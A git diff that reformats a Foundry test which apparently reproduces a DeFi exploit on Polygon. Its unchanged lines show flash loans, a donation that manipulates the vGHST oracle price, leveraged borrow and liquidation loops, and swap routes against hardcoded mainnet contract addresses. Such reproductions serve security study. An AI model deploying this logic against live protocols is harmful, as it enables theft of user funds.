@@ -44,9 +44,7 @@ interface ISwapFlashLoan {
         uint256 dx,
         uint256 minDy,
         uint256 deadline
-    )
-        external
-        returns(uint256);
+    ) external returns (uint256);
 }
 
 contract ContractTest is Test {
@@ -86,7 +84,7 @@ contract ContractTest is Test {
     Uni_Pair_V3 UniV3Pair1 = Uni_Pair_V3(0xA374094527e1673A86dE625aa59517c5dE346d32);
     Uni_Pair_V3 UniV3Pair2 = Uni_Pair_V3(0x50eaEDB835021E4A108B7290636d62E9765cc6d7);
     Uni_Pair_V3 UniV3Pair3 = Uni_Pair_V3(0x8f16A8E864162ec84a2906646E08a561b5A7f72d);
-    Uni_Pair_V3 UniV3Pair4 = Uni_Pair_V3(0x45dDa9cb7c25131DF268515131f647d726f50608 );
+    Uni_Pair_V3 UniV3Pair4 = Uni_Pair_V3(0x45dDa9cb7c25131DF268515131f647d726f50608);
     ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x85fCD7Dd0a1e1A9FCD5FD886ED522dE8221C3EE5);
     IDMMLP DMMLP = IDMMLP(0xAb08b0C9DADC343d3795dAE5973925c3b6e39977);
 
@@ -146,13 +144,13 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint(
             "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
-            );
+        );
         emit log_named_decimal_uint(
             "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
-            );
+        );
         emit log_named_decimal_uint(
             "Attacker GHST balance after exploit", GHST.balanceOf(address(this)), GHST.decimals()
-            );
+        );
     }
     // aaveV3, aaveV2 FlashLoan callback
 
@@ -205,7 +203,7 @@ contract ContractTest is Test {
         console.log("the price of vGHST before donate:\t", vGHST.convertVGHST(1e18));
         GHST.transfer(address(vGHST), 1_656_000 * 1e18); // VGHSTOracle price manipulation
         console.log("the price of vGHST after donate:\t", vGHST.convertVGHST(1e18));
-        
+
         console.log("5. liquidate Leveraged Debt and Get back USDC collateral");
         liquidateLeveragedDebt(); // liquidate Leveraged Debt
         oUSDC.redeem(oUSDC.balanceOf(address(this))); // Get back USDC collateral
@@ -234,8 +232,8 @@ contract ContractTest is Test {
             ovGHST.liquidateBorrow(address(exploiter), liquidateAmount, address(oUSDC));
             ovGHST.redeemUnderlying(liquidateAmount);
         }
-        ovGHST.liquidateBorrow(address(exploiter), 336548170226199618982307, address(oUSDC));
-        ovGHST.redeemUnderlying(336548170226199618982307);
+        ovGHST.liquidateBorrow(address(exploiter), 336_548_170_226_199_618_982_307, address(oUSDC));
+        ovGHST.redeemUnderlying(336_548_170_226_199_618_982_307);
     }
 
     function swapTokenToUSDAndGHST() internal {
@@ -302,31 +300,45 @@ contract ContractTest is Test {
     }
 
     function WMATICToUSDC() internal {
-        UniV3Pair1.swap(address(this), true, int256(WMATIC.balanceOf(address(this))), 70888624962869287903104, new bytes(0));
+        UniV3Pair1.swap(
+            address(this), true, int256(WMATIC.balanceOf(address(this))), 70_888_624_962_869_287_903_104, new bytes(0)
+        );
     }
 
     function WBTCToWETH() internal {
-        UniV3Pair2.swap(address(this), true, int256(WBTC.balanceOf(address(this))), 25729321748246614730688896004128086, new bytes(0));
+        UniV3Pair2.swap(
+            address(this),
+            true,
+            int256(WBTC.balanceOf(address(this))),
+            25_729_321_748_246_614_730_688_896_004_128_086,
+            new bytes(0)
+        );
     }
 
     function WETHToGHST() internal {
         WETH.transfer(address(UniV2Pair), 50 * 1e18);
         UniV2Pair.swap(47_600 * 1e18, 0, address(this), new bytes(0));
-        UniV3Pair3.swap(address(this), false, 65 * 1e18, 193488308442001139268702034900, new bytes(0));
+        UniV3Pair3.swap(address(this), false, 65 * 1e18, 193_488_308_442_001_139_268_702_034_900, new bytes(0));
     }
 
     function WETHToUSDC() internal {
-        UniV3Pair4.swap(address(this), false, 530 * 1e18, 1998382131994531085392415970245451, new bytes(0));
-        AlgebraPool2.swap(address(this), false, int256(WETH.balanceOf(address(this))), 1998382131994531085392415970245451, new bytes(0));
+        UniV3Pair4.swap(address(this), false, 530 * 1e18, 1_998_382_131_994_531_085_392_415_970_245_451, new bytes(0));
+        AlgebraPool2.swap(
+            address(this),
+            false,
+            int256(WETH.balanceOf(address(this))),
+            1_998_382_131_994_531_085_392_415_970_245_451,
+            new bytes(0)
+        );
     }
 
     function DAIToUSDT() internal {
-        DAI.approve(address(swapFlashLoan), type(uint).max);
+        DAI.approve(address(swapFlashLoan), type(uint256).max);
         swapFlashLoan.swap(1, 3, DAI.balanceOf(address(this)), 150_000 * 1e6, block.timestamp);
     }
 
     function USDCToGHST() internal {
-        USDC.approve(address(Balancer), type(uint).max);
+        USDC.approve(address(Balancer), type(uint256).max);
         IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
             poolId: 0xae8f935830f6b418804836eacb0243447b6d977c000200000000000000000ad1,
             kind: IBalancerVault.SwapKind.GIVEN_IN,
@@ -342,22 +354,23 @@ contract ContractTest is Test {
             toInternalBalance: false
         });
         Balancer.swap(singleSwap, funds, 0, block.timestamp);
-        AlgebraPool3.swap(address(this), true, 900_000 * 1e6, 565521259495684628339632353478984, new bytes(0)); 
+        AlgebraPool3.swap(address(this), true, 900_000 * 1e6, 565_521_259_495_684_628_339_632_353_478_984, new bytes(0));
         USDC.transfer(address(AavegotchiPoolPair), 310_000 * 1e6);
         AavegotchiPoolPair.swap(0, 158_000 * 1e18, address(this), new bytes(0));
     }
 
     function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
-        if(amount0Delta > 0){
+        if (amount0Delta > 0) {
             IERC20(IAlgebraPool(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
-        } else if(amount1Delta > 0) {
+        } else if (amount1Delta > 0) {
             IERC20(IAlgebraPool(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
         }
     }
+
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
-        if(amount0Delta > 0){
+        if (amount0Delta > 0) {
             IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
-        } else if(amount1Delta > 0) {
+        } else if (amount1Delta > 0) {
             IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
         }
     }
@@ -431,7 +444,6 @@ contract Exploiter {
         for (uint256 i; i < amountOfOptions; i++) {
             ovGHST.mint(vGHSTAmount);
             ovGHST.borrow(vGHSTAmount);
-            
         }
         vGHST.transfer(owner, vGHSTAmount);
         ovGHST.transfer(owner, ovGHST.balanceOf(address(this)));
